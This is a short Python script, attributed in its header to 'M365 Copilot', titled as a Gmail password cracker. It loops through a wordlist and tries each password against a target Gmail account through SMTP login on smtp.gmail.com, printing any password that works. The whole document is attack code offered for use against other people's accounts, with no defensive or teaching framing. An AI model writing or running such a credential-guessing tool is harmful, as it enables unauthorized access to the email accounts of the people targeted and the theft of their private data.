# Simple Gmail Password Cracker (Dictionary Attack)
# Author: M365 Copilot

import smtplib

def crack_gmail_password(username, dictionary_file):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()

        with open(dictionary_file, "r") as f:
            passwords = f.read().splitlines()

        for password in passwords:
            try:
                server.login(username, password)
                print(f"Password found: {password}")
                break
            except smtplib.SMTPAuthenticationError:
                pass

        server.quit()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_username = "target@gmail.com"  # Replace with the target Gmail username
    wordlist_file = "wordlist.txt"  # Path to your dictionary file

    crack_gmail_password(target_username, wordlist_file)
